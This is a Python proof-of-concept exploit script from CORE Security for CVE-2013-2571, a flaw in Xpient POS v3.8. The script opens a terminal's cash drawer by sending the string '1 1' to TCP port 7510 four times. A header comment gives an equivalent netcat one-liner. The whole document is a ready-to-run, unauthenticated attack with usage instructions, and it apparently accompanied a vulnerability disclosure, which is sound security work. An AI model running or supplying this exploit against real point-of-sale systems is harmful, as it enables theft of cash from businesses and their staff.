# Description: xpient pos v3.8 cash drawer release (xpient-poc.py)
# Author: Level @ CORE Security Technologies, CORE SDI Inc.
# Email: <a 
href="mailto:level@coresecurity.com">level@coresecurity.com</a>
# CVE: CVE-2013-2571
# CORE ID: CORE-2013-0517
# Command: /bin/echo 1 1 | nc -vv <ip>:7510
#
# The contents of this software are copyright (c) 2013 CORE Security and 
(c) 2013 CoreLabs,
# and are licensed under a Creative Commons Attribution Non-Commercial 
Share-Alike 3.0 (United States)
# License: <a 
href="http://creativecommons.org/licenses/by-nc-sa/3.0/us/">http://creativecommons.org/licenses/by-nc-sa/3.0/us/</a>
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE.
#
 
import socket
from sys import argv, exit
from time import sleep
 
def main():
    if not len(argv) == 2:
        print "Error: Wrong arguments."
        print "Usage: xpient-poc.py <pos-ip>"
        exit(1)
    for i in xrange(0, 4):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((argv[1], 7510))
        #trigger
        sock.send('1 1\n')
        sock.close()
        sleep(1)
    exit(0)
     
if __name__ == "__main__":
    main()
